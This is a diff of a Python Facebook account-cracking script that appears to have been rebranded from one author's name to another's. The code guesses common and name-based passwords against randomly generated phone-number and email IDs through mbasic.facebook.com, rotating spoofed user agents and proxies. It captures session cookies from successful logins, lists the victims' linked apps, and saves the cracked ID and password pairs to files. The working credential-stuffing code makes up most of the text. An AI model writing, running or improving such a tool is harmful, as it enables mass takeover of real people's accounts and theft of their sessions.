@@ -56,7 +56,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python MRX-JIBON.py')
+    os.system('python Hamii.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -217,7 +217,7 @@ for x in range(999):
 #	mi = f'{A}{B}{C}'
 #	if mi in redmi:pass
 #	else:redmi.append(mi)
-	A = f'Mozilla/5.0 (Linux; Android 12; TECNO BF7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]' ,'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Lite Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/324.0.0.8.106;]' ,'Mozilla/5.0 (Linux; Android 10; Redmi Y1 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]' ,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note Prime Build/OPM1.171019.018) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36'
+	A = f'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.36' ,'Mozilla/5.0 (Linux; Android 10; Redmi Y3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322' ,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Y2 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/208.0.0.5.120;]' ,'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Lite Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/hi_IN;FBAV/324.0.0.8.106;]' ,'Mozilla/5.0 (Linux; Android 10; Redmi Y1 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]' ,'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note Prime Build/OPM1.171019.018) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36'
 	B = "Mozilla/5.0 (Linux; Android 12; A001XM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322" f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
 	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
 	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
@@ -230,7 +230,7 @@ except:sys.exit(f" [>] proxy dump failed")
 print(' total new proxy : '+str(len(abcd)))
 print(' total useragent : '+str(len(ugen)))
 sleep(1)
-os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
+os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
 logo = ("""
 \x1b[1;96m   oooo ooooo oooooooooo.    .oooooo.   ooooo      ooo
 \x1b[1;96m   `888 `888' `888'   `Y8b  d8P'  `Y8b  `888b.     `8'
@@ -264,21 +264,21 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        #print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
-    #else:
-        #print(f'  \r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
+        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
+    else:
+        print(f'  \r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
         for i in range(len(game)):
             print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) jibon
+            #created by hbf team(owner) Hamii
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        #print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
-        #print()
-    #else:
-        #print(f'  \r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
+        print(f'  \r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
+        print()
+    else:
+        print(f'  \r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
         for i in range(len(game)):
             print(f"  \r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
@@ -303,11 +303,11 @@ class Main:
         os.system("clear")
         print(logo)
         print("  [01] Bd Random Uid Clone")
-        print("  [02] Random Email Clone")
+        print("  [02] Random Email Clone ")
         print("  [00] Exit")
         print("  \x1b[1;96m--------------------------------------------------")
-        Mumit =input("  \033[1;32m[?] Choose : ")
-        os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
+        Mumit =input("  [?] Choose : ")
+        os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
         if Mumit in ["1", "01"]:
             num()
         if Mumit in ["2","02"]:
@@ -320,16 +320,16 @@ def num():
     user=[]
     os.system('clear')
     print(logo)
-    print('  \033[1;32m[+] EXAMPLE : 017. 018. 019. 016. 013. 014 ')
+    print('  [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
     print("  \x1b[1;96m--------------------------------------------------")
-    kode = input('  \x1b[1;96m[?] Enter sim code: ')
+    kode = input('  [?] Enter sim code: ')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
-    print('  \033[1;32m[+] EXAMPLE : 2000, 5000, 10000, 50000 ')
+    print('  [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
     print("  \x1b[1;96m--------------------------------------------------")
-    limit = int(input('  \x1b[1;96m[?] Crack Limit : '))
+    limit = int(input('  [?] Crack Limit : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -339,14 +339,14 @@ def num():
         tl = str(len(user))
         ip = requests.get("https://api.ipify.org").text
         #jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
-        print(' \033[1;32m [+] Total ids:\033[38;5;45m '+tl)
-        print(' \033[1;32m [+] Process has been started')
-        print(' \033[1;32m [!] Wait for ids ')
-        print(' \033[1;32m [!] Use flight mode for speed up ')
+        print(' \033[0m [+] Total ids:\033[38;5;45m '+tl)
+        print(' \033[0m [+] Process has been started')
+        print(' \033[0m [!] Wait for ids ')
+        print(' \033[0m [!] Use flight mode for speed up ')
         print("  \x1b[1;96m--------------------------------------------------")
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'@@@###','123@@@','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you','Sakib123','sakib123','@sakib123','@sakib',]
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'@@@###','123@@@','bangladesh','i love you','Bangladesh','free fire','Free fire','I love you',]
             yaari.submit(rcrack1,uid,pwx,tl)
     print('  [+] Crack process has been completed')
     print('  [+] Ids saved in ok.txt,cp.txt')
@@ -355,20 +355,20 @@ def gml():
     user=[]
     os.system('clear')
     print(logo)
-    kode = input('  \x1b[1;96m[?] Target fast name : ')
+    kode = input('  [?] Target fast name : ')
     os.system('clear')
     print(logo)
-    kodex = input('  \x1b[1;96m[?] Target last name :  ')
+    kodex = input('  [?] Target last name :  ')
     os.system('clear')
     print(logo)
-    print('  \033[1;32m[+] EXAMPLE : @gmail.com, @yahoo.com ')
+    print('  [+] EXAMPLE : @gmail.com, @yahoo.com ')
     print("  \x1b[1;96m--------------------------------------------------")
     doamin = input('  [?] Terget doamin : ')
     os.system('clear')
     print(logo)
-    print('  \033[1;32m[+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print('  [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
     print("  \x1b[1;96m--------------------------------------------------")
-    limit = int(input(' \x1b[1;96m[?] Crack Limit : '))
+    limit = int(input(' [?] Crack Limit : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
         user.append(nmp)
@@ -377,12 +377,12 @@ def gml():
         print(logo)
         tl = str(len(user))
         ip = requests.get("https://api.ipify.org").text
-        #("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
-        print(' \033[1;32m [+] Total ids:\033[38;5;45m '+tl)
-        print(' \033[1;32m [+] Process has been started')
-        print(' \033[1;32m [!] Wait for ids ')
-        print(' \033[1;32m [!] Use flight mode for speed up ')
-        print("\x1b[1;96m--------------------------------------------------")
+        jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
+        print(' \033[0m [+] Total ids:\033[38;5;45m '+tl)
+        print(' \033[0m [+] Process has been started')
+        print(' \033[0m [!] Wait for ids ')
+        print(' \033[0m [!] Use flight mode for speed up ')
+        print("  \x1b[1;96m--------------------------------------------------")
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@@',kode+'###',kode+'@1234',kode+'@123',kode+'@12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'@@@',kodex+'###',kodex+'@1234',kodex+'@123',kodex+'@12345',]
@@ -399,7 +399,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r [\033[38;5;46mJIBON\033[1;97m] [\033[38;5;45m%s\033[0m/%s | OK\033[1;97m:-\033[38;5;46m%s\033[1;97m | CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
+            sys.stdout.write('\r [\033[38;5;46mJIBON\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -438,7 +438,7 @@ def rcrack1(uid,pwx,tl):
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
                 #os.system("play-audio JIBON_OK.mp3")
-                print('\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f" Cookie : {coki}")
                 cek_apk(session,coki)
                 open('/sdcard/ MRX-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -457,7 +457,7 @@ def rcrack1(uid,pwx,tl):
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
                   #  os.system("play-audio JIBON_CP.mp3")
-                    print('\33[1;92m[JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
+                    print(f'\r\x1b[38;5;191m[JIBON-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/MRX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
